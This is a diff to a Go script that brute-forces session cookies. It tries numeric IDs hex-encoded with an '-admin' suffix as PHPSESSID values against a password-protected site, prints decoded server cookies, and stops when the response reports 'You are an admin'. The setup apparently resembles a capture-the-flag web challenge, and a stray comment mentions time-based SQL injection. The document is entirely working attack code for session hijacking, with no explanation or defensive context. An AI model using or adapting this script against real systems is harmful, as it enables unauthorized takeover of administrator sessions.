@@ -3,6 +3,7 @@ package main
 import (
 	"bytes"
 	"encoding/base64"
+	"encoding/hex"
 	"fmt"
 	"net/http"
 	"strconv"
@@ -10,12 +11,14 @@ import (
 )
 
 func main() {
-	max := 640
+
+	max := 700
 	for index := 0; index < max; index++ {
 		if result(strconv.Itoa(index)) {
 			break
 		}
 	}
+
 }
 
 //SQL Injection time based
@@ -30,7 +33,8 @@ func result(pass string) bool {
 	req, _ := http.NewRequest("GET",
 		baseURL+query, nil)
 	req.Header.Add("Authorization", "Basic "+basicAuth(usr, psw))
-	cookie := http.Cookie{Name: "PHPSESSID", Value: pass}
+
+	cookie := http.Cookie{Name: "PHPSESSID", Value: hex.EncodeToString([]byte(pass + "-admin"))}
 	req.AddCookie(&cookie)
 
 	//start := time.Now()
@@ -42,6 +46,13 @@ func result(pass string) bool {
 	bs := buf.String()
 	//fmt.Println(bs)
 
+	cook := res.Cookies()
+	if len(cook) > 0 {
+		hx, err := hex.DecodeString(cook[0].Value)
+		if err == nil {
+			fmt.Println(string(hx))
+		}
+	}
 	fmt.Print(pass, " ")
 
 	if strings.Contains(bs, "You are an admin") {
